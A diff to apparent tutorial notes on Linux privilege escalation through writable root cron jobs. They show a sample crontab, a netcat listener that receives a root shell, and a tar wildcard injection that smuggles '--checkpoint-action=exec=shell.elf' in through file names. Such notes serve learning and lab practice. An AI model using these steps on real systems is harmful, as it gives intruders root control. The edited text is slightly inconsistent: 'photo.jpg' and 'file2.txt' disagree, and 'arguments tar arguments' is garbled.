@@ -15,16 +15,25 @@ any inserted code will run with elevated privileges.
   Host a netcat listener on your local machine. Once the cronjob runs, the victim machine will 
   connect to your listener, with a mirrored privileged shell (in this case, root)
 
-## Step one is to check if crontabs are exploitable ##
+## Checking if crontabs are exploitable ##
 
-- Check for available cronjobs
+- List system-wide cron jobs
     cat /etc/crontab
 
-- If there are available cronjobs, search for their paths
-    locate <cronjob>
+- Identify cronjobs and their permissions
 
-- Once you have the path to a cronjob, list its permissions
-    ls -l /path/to/cronjob
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m  h dom mon dow user  command
+17 *  *   *   *   root   /usr/local/bin/backup.sh
+30 2  *   *   *   root   /opt/scripts/clean_temp.sh
+45 1  *   *   *   root   /home/public/run_me.sh
+
+    Here are three cronjobs, all running as root and their file locations, which also happen to be 
+    the command you would enter, in order to manually run them
+
+- If any of the listed cronjobs are running as root and are globally writeable, they are exploitable
 
 ## Wildcard Injection Exploit ##
 
@@ -52,8 +61,8 @@ exploit the tar program and its arguments to gain root access
   The process is going to go like this:
 	The script within the cronjob tells the computer to compress the specified directory
 	Once the cronjob runs, it's going to compress the directory but will also read the two newly
-		created files as arguments for the tar program, so the script will turn into:
-	tar czf /tmp/backup.tar.gz file1.txt photo.jpg --checkpoint=1 --checkpoint-action=exec=shell.elf
+		created files as arguments tar arguments, so the script will turn into:
+	tar czf /tmp/backup.tar.gz file1.txt file2.txt --checkpoint=1 --checkpoint-action=exec=shell.elf
 	This full command is telling the computer to compress the chosen directory: tar czf /tmp/backup.tar.gz
 	Then the files within the directory become part of the arguments: file1.txt photo.jpg --checkpoint=1 --checkpoint-action=exec=shell.elf
 	The final two arguments run the exploit. They are telling the computer that "upon processing any one file (--checkpoint=1) to then run
